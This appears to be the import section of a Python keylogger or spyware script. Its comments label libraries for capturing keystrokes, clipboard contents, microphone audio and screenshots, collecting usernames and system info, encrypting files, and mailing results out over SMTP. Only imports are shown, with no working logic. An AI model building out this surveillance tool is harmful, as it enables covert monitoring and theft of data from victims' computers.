# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

    # to collect computer info
import socket
import platform

    # the clipboard
import win32clipboard

    # grab keystrokes
from pynput.keyboard import Key, Listener

    # track time
import time
import os

    # microphone capabilities
from scipy.io.wavfile import write
import sounddevice as sd

    # to encrypt files
from cryptography.fernet import Fernet

import getpass              # to get usernames
from requests import get    # to get computer information

from multiprocessing import Process, freeze_support         # to get one screenshot at a time
from PIL import ImageGrab                                   # to grab images
